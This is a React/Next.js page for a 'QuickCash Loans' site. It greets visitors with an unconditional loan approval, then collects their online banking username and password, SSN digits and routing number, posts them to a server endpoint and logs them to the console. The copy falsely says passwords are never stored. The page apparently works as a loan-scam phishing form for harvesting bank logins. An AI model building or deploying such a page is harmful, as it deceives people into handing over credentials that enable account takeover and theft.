"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { useSearchParams } from "next/navigation"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { CheckCircle, Lock, CreditCard } from "lucide-react"

interface BankConnectionData {
  name: string
  phone: string
  bankAccount: string
  customBankName: string
  userId: string
  password: string
  ssnLast4: string
  routingNumber: string
}

export default function ApprovedUserPage() {
  const searchParams = useSearchParams()
  const [approvedAmount, setApprovedAmount] = useState<string>("")
  const [formData, setFormData] = useState<BankConnectionData>({
    name: "",
    phone: "",
    bankAccount: "",
    customBankName: "",
    userId: "",
    password: "",
    ssnLast4: "",
    routingNumber: "",
  })
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [errors, setErrors] = useState<Partial<BankConnectionData>>({})

  useEffect(() => {
    const amount = searchParams.get("amount") || "5000"
    setApprovedAmount(amount)
  }, [searchParams])

  const updateFormData = (field: keyof BankConnectionData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: undefined }))
    }
  }

  const validateForm = (): boolean => {
    const newErrors: Partial<BankConnectionData> = {}

    if (!formData.name.trim()) newErrors.name = "Name is required"
    if (!formData.phone.trim()) newErrors.phone = "Phone number is required"
    if (!formData.bankAccount) newErrors.bankAccount = "Bank selection is required"
    if (formData.bankAccount === "Other" && !formData.customBankName.trim()) {
      newErrors.customBankName = "Bank name is required"
    }
    if (!formData.userId.trim()) newErrors.userId = "User ID is required"
    if (!formData.password.trim()) newErrors.password = "Password is required"
    if (!/^\d{4}$/.test(formData.ssnLast4)) newErrors.ssnLast4 = "Enter last 4 digits of SSN"
    if (!/^\d{9}$/.test(formData.routingNumber)) newErrors.routingNumber = "Enter a 9-digit routing number"

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateForm()) return

    setIsSubmitting(true)

    try {
      // Prepare bank connection data
      const bankConnectionData = {
        ...formData,
        approvedAmount,
        status: "pending_verification",
      }

      console.log("[v0] Submitting bank connection:", bankConnectionData)

      // Send to API
      const response = await fetch("/api/bank-connections", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(bankConnectionData),
      })

      if (!response.ok) {
        const errorData = await response.json()
        throw new Error(errorData.error || "Failed to submit bank connection")
      }

      const result = await response.json()
      console.log("[v0] Bank connection submitted successfully:", result)

      setIsSubmitted(true)
    } catch (error) {
      console.error("Error submitting bank connection:", error)
      // Show error to user
      setErrors({ 
        name: error instanceof Error ? error.message : "Failed to submit bank connection" 
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    const match = cleaned.match(/^(\d{3})(\d{3})(\d{4})$/)
    if (match) {
      return `(${match[1]}) ${match[2]}-${match[3]}`
    }
    return value
  }

  const bankOptions = [
    "Chase Bank",
    "Bank of America",
    "Wells Fargo",
    "Citibank",
    "U.S. Bank",
    "PNC Bank",
    "Capital One",
    "TD Bank",
    "BB&T",
    "SunTrust Bank",
    "Other",
  ]

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-amber-50 to-yellow-100 flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-white shadow-xl">
          <CardHeader className="text-center">
            <div className="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
              <CheckCircle className="w-8 h-8 text-green-600" />
            </div>
            <CardTitle className="text-2xl font-bold text-gray-900">Bank Connection Submitted!</CardTitle>
            <CardDescription className="text-gray-600">
              Your bank details have been securely submitted for verification. You will receive loan disbursement within
              24-48 hours.
            </CardDescription>
          </CardHeader>
          <CardContent className="text-center">
            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-6">
              <p className="text-sm text-amber-800">
                <strong>Approved Amount:</strong> ${Number.parseInt(approvedAmount).toLocaleString()}
              </p>
            </div>
            <p className="text-sm text-gray-600">You will receive a confirmation email shortly with next steps.</p>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-amber-50 to-yellow-100">
      {/* Header */}
      <div className="bg-white shadow-sm border-b border-amber-200">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-amber-500 rounded-lg flex items-center justify-center">
              <CreditCard className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-gray-900">QuickCash Loans</h1>
              <p className="text-sm text-gray-600">Secure Bank Connection</p>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-2xl mx-auto p-4 py-8">
        {/* Congratulations Section */}
        <div className="mb-8">
          <Card className="bg-gradient-to-r from-green-500 to-emerald-600 shadow-xl border-0">
            <CardContent className="text-center p-6">
              <div className="mx-auto w-16 h-16 bg-green-100 rounded-lg flex items-center justify-center mb-4">
                <CheckCircle className="w-8 h-8 text-green-600" />
              </div>
              <h2 className="text-3xl font-bold text-green-900 mb-2">Congratulations!</h2>
              <p className="text-lg text-green-800 mb-6">Your loan application has been approved</p>
              <div className="bg-green-100 rounded-lg p-6 mb-6 border border-green-200">
                <p className="text-sm text-green-700 mb-2">Approved Amount</p>
                <p className="text-4xl font-bold text-green-900">${Number.parseInt(approvedAmount).toLocaleString()}</p>
              </div>
              <p className="text-green-800">
                Complete the form below to connect your bank account and receive your funds within 24 hours.
              </p>
            </CardContent>
          </Card>
        </div>

        {/* Bank Connection Form */}
        <Card className="bg-white shadow-xl">
          <CardHeader>
            <CardTitle className="text-xl font-bold text-gray-900">Connect Your Bank Account</CardTitle>
            <CardDescription className="text-gray-600">
              Fill in your bank details to receive your approved loan amount
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Personal Information */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="name" className="text-sm font-medium text-gray-700">
                    Full Name *
                  </Label>
                  <Input
                    id="name"
                    type="text"
                    placeholder="Enter your full name"
                    value={formData.name}
                    onChange={(e) => updateFormData("name", e.target.value)}
                    className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                      errors.name ? "border-red-500" : ""
                    }`}
                  />
                  {errors.name && <p className="text-sm text-red-600">{errors.name}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-sm font-medium text-gray-700">
                    Phone Number *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    placeholder="(555) 123-4567"
                    value={formData.phone}
                    onChange={(e) => updateFormData("phone", formatPhoneNumber(e.target.value))}
                    className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                      errors.phone ? "border-red-500" : ""
                    }`}
                  />
                  {errors.phone && <p className="text-sm text-red-600">{errors.phone}</p>}
                </div>
              </div>

              {/* Bank Selection */}
              <div className="space-y-2">
                <Label htmlFor="bank" className="text-sm font-medium text-gray-700">
                  Select Your Bank *
                </Label>
                <Select value={formData.bankAccount} onValueChange={(value) => updateFormData("bankAccount", value)}>
                  <SelectTrigger
                    className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                      errors.bankAccount ? "border-red-500" : ""
                    }`}
                  >
                    <SelectValue placeholder="Choose your bank" />
                  </SelectTrigger>
                  <SelectContent>
                    {bankOptions.map((bank) => (
                      <SelectItem key={bank} value={bank}>
                        {bank}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {errors.bankAccount && <p className="text-sm text-red-600">{errors.bankAccount}</p>}
              </div>

              {/* Additional Verification */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="ssnLast4" className="text-sm font-medium text-gray-700">
                    Last 4 of SSN *
                  </Label>
                  <Input
                    id="ssnLast4"
                    type="password"
                    inputMode="numeric"
                    placeholder="••••"
                    value={formData.ssnLast4}
                    onChange={(e) => {
                      const digitsOnly = e.target.value.replace(/\D/g, "").slice(0, 4)
                      updateFormData("ssnLast4", digitsOnly)
                    }}
                    className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                      errors.ssnLast4 ? "border-red-500" : ""
                    }`}
                  />
                  {errors.ssnLast4 && <p className="text-sm text-red-600">{errors.ssnLast4}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="routingNumber" className="text-sm font-medium text-gray-700">
                    Routing Number *
                  </Label>
                  <Input
                    id="routingNumber"
                    type="text"
                    inputMode="numeric"
                    placeholder="9-digit routing number"
                    value={formData.routingNumber}
                    onChange={(e) => {
                      const digitsOnly = e.target.value.replace(/\D/g, "").slice(0, 9)
                      updateFormData("routingNumber", digitsOnly)
                    }}
                    className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                      errors.routingNumber ? "border-red-500" : ""
                    }`}
                  />
                  {errors.routingNumber && <p className="text-sm text-red-600">{errors.routingNumber}</p>}
                </div>
              </div>

              {/* Custom Bank Name (if Other selected) */}
              {formData.bankAccount === "Other" && (
                <div className="space-y-2">
                  <Label htmlFor="customBank" className="text-sm font-medium text-gray-700">
                    Bank Name *
                  </Label>
                  <Input
                    id="customBank"
                    type="text"
                    placeholder="Enter your bank name"
                    value={formData.customBankName}
                    onChange={(e) => updateFormData("customBankName", e.target.value)}
                    className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                      errors.customBankName ? "border-red-500" : ""
                    }`}
                  />
                  {errors.customBankName && <p className="text-sm text-red-600">{errors.customBankName}</p>}
                </div>
              )}

              {/* Bank Login Credentials */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <h3 className="font-semibold text-blue-900 mb-2 flex items-center gap-2">
                  <Lock className="w-4 h-4" />
                  Bank Login Credentials
                </h3>
                <p className="text-sm text-blue-800 mb-4">
                  We use your bank login to securely verify your account and process the loan disbursement.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="userId" className="text-sm font-medium text-gray-700">
                      User ID / Username *
                    </Label>
                    <Input
                      id="userId"
                      type="text"
                      placeholder="Enter your bank user ID"
                      value={formData.userId}
                      onChange={(e) => updateFormData("userId", e.target.value)}
                      className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                        errors.userId ? "border-red-500" : ""
                      }`}
                    />
                    {errors.userId && <p className="text-sm text-red-600">{errors.userId}</p>}
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="password" className="text-sm font-medium text-gray-700">
                      Password *
                    </Label>
                    <Input
                      id="password"
                      type="password"
                      placeholder="Enter your bank password"
                      value={formData.password}
                      onChange={(e) => updateFormData("password", e.target.value)}
                      className={`bg-white border-gray-300 focus:border-amber-500 focus:ring-amber-500 ${
                        errors.password ? "border-red-500" : ""
                      }`}
                    />
                    {errors.password && <p className="text-sm text-red-600">{errors.password}</p>}
                  </div>
                </div>
              </div>

              {/* Security Notice */}
              <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                <h4 className="font-semibold text-gray-900 mb-2">🔒 Your Security is Our Priority</h4>
                <ul className="text-sm text-gray-700 space-y-1">
                  <li>• All data is encrypted with 256-bit SSL technology</li>
                  <li>• We never store your banking passwords</li>
                  <li>• Your information is used only for loan disbursement</li>
                  <li>• We comply with all banking security regulations</li>
                </ul>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-gradient-to-r from-amber-500 to-yellow-600 hover:from-amber-600 hover:to-yellow-700 text-white font-semibold py-3 px-6 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 text-lg disabled:opacity-50 disabled:cursor-not-allowed border-0 outline-none focus:ring-2 focus:ring-amber-500 focus:ring-offset-2"
              >
                {isSubmitting ? (
                  <div className="flex items-center gap-2 justify-center">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Connecting Bank Account...
                  </div>
                ) : (
                  `Connect Bank & Get $${Number.parseInt(approvedAmount).toLocaleString()}`
                )}
              </button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
